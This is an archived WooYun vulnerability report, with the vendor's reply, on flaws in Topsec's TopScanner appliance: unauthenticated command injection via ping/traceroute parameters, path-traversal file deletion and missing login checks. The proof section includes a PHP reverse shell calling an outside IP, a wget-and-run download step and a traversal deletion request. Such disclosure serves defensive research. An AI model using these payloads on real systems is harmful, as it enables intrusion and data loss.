{"id": 85953, "wybug_id": "wooyun-2016-0171065", "wybug_title": "天融信TopScanner多处高危漏洞大礼包终结版(无需登录)", "wybug_corp": "天融信", "wybug_author": "xfkxfk", "wybug_date": "2016-01-19 11:17", "wybug_open_date": "2016-04-11 16:08", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "源码审核", "设计不当导致攻击界面扩大"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-22：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-03-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-03-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-04-11：\t细节向公众公开  简要描述： 天融信TopScanner多处高危漏洞终结大礼包，命令执行，任意文件删除，全局设计缺陷等，均无需登录，成功shell。 详细说明：  0x01 多处命令执行漏洞文件direct/polling/CommandsPolling.php\n<?phpinclude_once 'command/CCmdsPolling.php';$command = isset($_POST['command'])?$_POST['command']:\"\";$saveFile = isset($_POST['filename'])?$_POST['filename']:\"\";$cmdParam = isset($_POST['cmdParam'])?$_POST['cmdParam']:\"\";$cmdParam = trim($cmdParam);$faultStr = json_encode(array('type'=>'event', 'name'=>'message', 'data'=>array(\"exception\", \"\", \"\") ));//command is nullif(empty($command)){      echo $faultStr;    exit();}//exec and get result$result = array();$pollingObj = new CCmdsPolling();if($command == \"ping\") {    $result = $pollingObj->getPingInfo($cmdParam, $saveFile);} else if ($command == \"traceroute\") {    $result = $pollingObj->getTracerouteInfo($cmdParam, $saveFile);} else {    echo $faultStr;    exit();}\n第一处命令执行：当$command == \"ping\"时，$cmdParam和$saveFile进入getPingInfo函数跟进文件command/CCmdsPolling.php\nfunction getPingInfo($pingIp, $saveFile)    {        $info=array();         if(empty($saveFile)) {           $saveFile = self::ping($pingIp);  //第一次发送命令,执行命令，生成需要的文件       }\n当$saveFile等于空时，继续跟进ping函数\nfunction ping($ip)    {        if(empty($ip))            return \"\";        \t        $filename = \"/tmp/\" . self::getClientAddr().\"ping\".$ip.\".txt\";        if($ip && $filename) {            if(file_exists($filename) ) {                unlink($filename);            }            $cmd = \"ping -c 5 $ip > $filename  2>&1 &\";            exec(\"$cmd \");          }        return $filename;    }\n注意看这里的$filename = \"/tmp/\" . self::getClientAddr().\"ping\".$ip.\".txt\";继续跟进getClientAddr函数\nfunction getClientAddr(){        unset($onlineip);          if($_SERVER['HTTP_CLIENT_IP']) {              $onlineip=$_SERVER['HTTP_CLIENT_IP'];          }else if($_SERVER['HTTP_X_FORWARDED_FOR']) {              $onlineip=$_SERVER['HTTP_X_FORWARDED_FOR'];          }else {              $onlineip=$_SERVER['REMOTE_ADDR'];          }        return $onlineip;    }\n这里直接获取ip，然后返回，无视此系统的GPC=on最后$filename可控，进入exec中被执行当然这里的ip也进入cmd，进入exec中被执行，此处已有人提交不在赘述第二处命令执行当$command == \"traceroute\"时，$cmdParam, $saveFile进入getTracerouteInfo函数跟进getTracerouteInfo函数，文件command/CCmdsPolling.php\nfunction getTracerouteInfo($address, $saveFile)    {         $info=array();          if(empty($saveFile)) {           $saveFile = self::traceroute($address);  //第一次发送命令,执行命令，生成需要的文件        }\n跟进traceroute函数：\nfunction traceroute($address)    {        if(!$address)            return \"\";        \t        $filename = \"/tmp/\". self::getClientAddr().\"traceroute\".$address.\".txt\";        if($address && $filename) {            if(file_exists($filename)) {                unlink($filename);            }            $cmd = \"traceroute -m \" . self::trace_max_hops . \" -n $address > $filename 2>&1 &\";            exec(\"$cmd \");         }        return $filename;    }\n注意看这里的$filename = \"/tmp/\" . self::getClientAddr().\"ping\".$ip.\".txt\";继续跟进getClientAddr函数\nfunction getClientAddr(){        unset($onlineip);          if($_SERVER['HTTP_CLIENT_IP']) {              $onlineip=$_SERVER['HTTP_CLIENT_IP'];          }else if($_SERVER['HTTP_X_FORWARDED_FOR']) {              $onlineip=$_SERVER['HTTP_X_FORWARDED_FOR'];          }else {              $onlineip=$_SERVER['REMOTE_ADDR'];          }        return $onlineip;    }\n这里直接获取ip，然后返回，无视此系统的GPC=on最后$filename可控，进入exec中被执行当然这里的ip也进入cmd，进入exec中被执行，此处已有人提交不在赘述0x02 多处任意文件删除漏洞第一处文件删除：文件/task/webapi/update.php\n<?require_once(\"datalayer/CDatalayer.php\");include_once \"base/CShellExec.php\";$shell = new CShellExec();$dl = new DataLayer();$cn = $dl->connectDB();$dl->queryDB($cn,\"use scandb\");$dl->queryDB($cn,\"delete from t_pluginadding\");$success = false;$result = $dl->queryDB($cn,\"select * from t_SystemProperty where System_Property='vul_current_version'\");$row = $dl->fetchArray($result);$vulCurrentVersion = $row[\"System_Value\"];$dl->queryDB($cn,\"update t_SystemProperty set System_value='$vulCurrentVersion' where System_Property='vul_old_version'\");set_time_limit(0);if($_GET[\"package\"]){\t$filename = $_GET[\"package\"];\t$tmpFilename = \"/tmp/update_\".time().\".des\";\t\t$filename = trim($filename,\"\\\\\");\t$filename = \"/tmp/\".$filename;\t\t$cmd = \"/usr/sbin/openssl enc -des -d -a -in \".$filename.\" -out \".$tmpFilename.\" -pass pass:rmd@NetP0wer\"; \t$shell->Execute($cmd,\"\",true);\t$dirname = $tmpFilename.\".dir\";\tmkdir($dirname,0777);}else{......}......unlink($filename);unlink($tmpFilename);system(\"rm -rf \".$dirname);echo $success;?>\n可以看到$filename = $_GET[\"package\"];然后进过一些操作后并没有exit最后$filename进入unlink，导致任意文件删除当然这里也是存在命令执行的，在$shell->Execute这里因为已经有人提交了，就不在赘述了第二处和第三处文件删除：文件direct/polling/CommandsPolling.php\n<?phpinclude_once 'command/CCmdsPolling.php';$command = isset($_POST['command'])?$_POST['command']:\"\";$saveFile = isset($_POST['filename'])?$_POST['filename']:\"\";$cmdParam = isset($_POST['cmdParam'])?$_POST['cmdParam']:\"\";$cmdParam = trim($cmdParam);$faultStr = json_encode(array('type'=>'event', 'name'=>'message', 'data'=>array(\"exception\", \"\", \"\") ));//command is nullif(empty($command)){      echo $faultStr;    exit();}//exec and get result$result = array();$pollingObj = new CCmdsPolling();if($command == \"ping\") {    $result = $pollingObj->getPingInfo($cmdParam, $saveFile);} else if ($command == \"traceroute\") {    $result = $pollingObj->getTracerouteInfo($cmdParam, $saveFile);} else {    echo $faultStr;    exit();}\n$cmdParam, $saveFile参数分别进入getPingInfo和getTracerouteInfo函数跟进getPingInfo和getTracerouteInfo函数\nfunction getPingInfo($pingIp, $saveFile)    {        $info=array();         if(empty($saveFile)) {           $saveFile = self::ping($pingIp);  //第一次发送命令,执行命令，生成需要的文件       }......function ping($ip)    {        if(empty($ip))            return \"\";        \t        $filename = \"/tmp/\" . self::getClientAddr().\"ping\".$ip.\".txt\";        if($ip && $filename) {            if(file_exists($filename) ) {                unlink($filename);            }            $cmd = \"ping -c 5 $ip > $filename  2>&1 &\";            exec(\"$cmd \");          }        return $filename;    }......function getClientAddr(){        unset($onlineip);          if($_SERVER['HTTP_CLIENT_IP']) {              $onlineip=$_SERVER['HTTP_CLIENT_IP'];          }else if($_SERVER['HTTP_X_FORWARDED_FOR']) {              $onlineip=$_SERVER['HTTP_X_FORWARDED_FOR'];          }else {              $onlineip=$_SERVER['REMOTE_ADDR'];          }        return $onlineip;    }\n可见在getPingInfo函数中，然后当$saveFile为空时进入ping函数然后在ping函数中：$filename = \"/tmp/\" . self::getClientAddr().\"ping\".$ip.\".txt\";继续看看getClientAddr函数中，直接从$_SERVER中获取ip地址，然后返回所以这里就无视GPC了，且此系统时GPC=on的最后导致ping函数中的$filename可控，最后$filename进入unlink函数中$filename的值可用%00截断，导致任意文件删除第三处和第二处原理一样在traceroute函数中的$filename可控，最后$filename进入unlink函数中$filename的值可用%00截断，导致任意文件删除0x03 全局设计缺陷为什么叫全局，因为这是一个安全产品，说有功能都应该是登陆后操作但是这里在对对应功能操作是，根本没有验证登录状态所以无需登录就可操作全局页面功能此系统是设有全局登录验证函数的：如direct/polling/progressbarPolling.php文件中\nif(!($userName = GetSessionVariable('userName'))){   //取得登录用户名\techo json_encode(array(\t\t'type'=>'event',\t\t'name'=>'np_probe_device_alive_event',\t\t'data'=>false\t));\texit();}\n这里进行了登录状态验证，session中没有username即exit，看看GetSessionVariable函数文件base/session.php\nfunction GetSessionVariable($key){    return $_SESSION[netpower][$key];}\n从session中取userName得内容但是95%以上的地方都没有使用这样的验证如device/device_export.php直接导出设备信息distribute/vuldetial.php所以插件漏洞信息policy/param_export.php策略信息导出task/task_export.php任务信息导出等等   漏洞证明：  命令执行证明：当command=ping，filename为空，cmdParam不为空1、在vps上放置shell.php，内容为：\n<?php $sock=fsockopen(\"*.*.*.*\",61234);exec(\"/bin/sh -i <&3 >&3 2>&3\");?>\n2、利用这里的命令执行，下载shell.php文件到目标tmp目录下\nwget  http://*.*.*.*:8888/shell.php -O /tmp/shell.php\n\n\n3、然后利用这里的命令执行，执行下载后的/tmp/shell.php\nphp -f /tmp/shell.php\n\n\n4、成功反弹shell\n\n当command=traceroute时同理文件删除证明：利用设计缺陷中的无需登录文件上传，上传一个文件上去文件device/device_import.php\n<?/* * 上传文件 */$UploadAction=0;$TimeLimit=60; /*设置超时限制时间缺省时间为 30秒设置为0时为不限时 */set_time_limit($TimeLimit);   if(move_uploaded_file($_FILES[\"importUpload\"][\"tmp_name\"],\"/tmp/\" . $_FILES[\"importUpload\"][\"name\"]))   {\t   chmod(\"/tmp/\".$_FILES[\"importUpload\"][\"name\"],0777);       echo '{success:true, file:'.json_encode('文件已经被存储到:'.'/tmp/'.$_FILES['importUpload']['name']).'}';   }else{       echo '{faliure:true, file:上传出错！}';   \t   }set_time_limit(30); //恢复缺省超时设置?>\n上传文件到tmp下：\n\n成功上传：\n\n发送请求：\n**.**.**.**/task/webapi/update.php?package=../../../../../../../tmp/1\n即可删除文件/tmp/1\n\n\n\n成功删除   修复方案：     版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-01-19 14:16 厂商回复： 已确认，谢谢提交。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-19 18:03 |    \t\tMark0smith \t\t\t( 普通白帽子  |\t\t\t        Rank:136 漏洞数:55        | ^_^)\t\t \n  马克    \n     2016-01-22 12:16 |    \t\t苏安泽 \t\t\t( 普通白帽子  |\t\t\t        Rank:154 漏洞数:46        | 一个想成为演员的黑客~)\t\t \n  666，首页全部都是$    \n     2016-01-22 18:48 |    \t\tSai、 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | for fun……)\t\t \n  天融信是时候研究RSAS了，233    \n     2016-01-23 01:37 |    \t\t87技术联盟-Jack \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        | 来自于浩瀚网络中的小白！)\t\t \n  66666    \n     2016-01-24 21:03 |    \t\tJ′aron \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | 问题真实存在但是影响不大.)\t\t \n  $_$    \n     2016-01-25 11:12 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:243 漏洞数:31        | 开发真是日了狗了)\t\t \n  天融信是时候研究RSAS了，233    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}